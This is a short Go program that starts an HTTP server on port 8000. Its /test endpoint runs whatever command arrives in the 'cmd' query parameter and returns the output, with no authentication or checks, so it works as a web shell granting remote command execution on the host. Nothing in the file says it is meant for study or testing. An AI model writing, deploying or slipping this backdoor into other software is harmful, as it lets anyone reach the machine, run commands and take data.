package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"log"
	"strings"
)


func hello(w http.ResponseWriter, r *http.Request) {
	arg := r.URL.Query().Get("cmd")
	fmt.Println(w, "Executing ", string(arg))
	strarg := strings.Fields(arg)
	out, err := exec.Command(strarg[0],strarg[1:]...).Output()
        if err != nil {
        	log.Fatal(err)
    	}
        //e := out.Run()
	fmt.Fprintf(w, "Output: \n %s", out)
	//if e != nil {
        //	fmt.Fprintf(w,"cmd.Run() failed with \n")
        //}
}

func main() {
	go http.HandleFunc("/test", hello)
	http.ListenAndServe(":8000", nil)
}


